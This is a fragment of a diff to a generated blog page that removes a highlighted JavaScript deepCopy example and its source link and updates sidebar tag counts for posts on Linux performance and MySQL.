-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepCopy</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!src || <span class="keyword">typeof</span> src !== <span class="string">'object'</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'error arguments'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> target = src.constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[i] === <span class="string">'object'</span>) &#123;</span><br><span class="line">      target[i] = src[i].constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">      target[i] = deepCopy(src[i]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[i] = src[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><p><a href="http://www.lujianan.com/2016/07/18/deep-shallow/" target="_blank" rel="noopener">http://www.lujianan.com/2016/07/18/deep-shallow/</a></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
 
 <nav id="pagination">
   
@@ -866,13 +841,13 @@
   
     <li><a href="/tags/Gulp/">Gulp</a><small>4</small></li>
   
-    <li><a href="/tags/Linux性能优化/">Linux性能优化</a><small>2</small></li>
+    <li><a href="/tags/Linux性能优化/">Linux性能优化</a><small>4</small></li>
   
     <li><a href="/tags/MongoDB/">MongoDB</a><small>2</small></li>
   
     <li><a href="/tags/Mongoose/">Mongoose</a><small>6</small></li>
   
-    <li><a href="/tags/MySQL实战/">MySQL实战</a><small>3</small></li>
+    <li><a href="/tags/MySQL实战/">MySQL实战</a><small>4</small></li>
   
     <li><a href="/tags/Node-js-IO/">Node.js_IO</a><small>4</small></li>
   
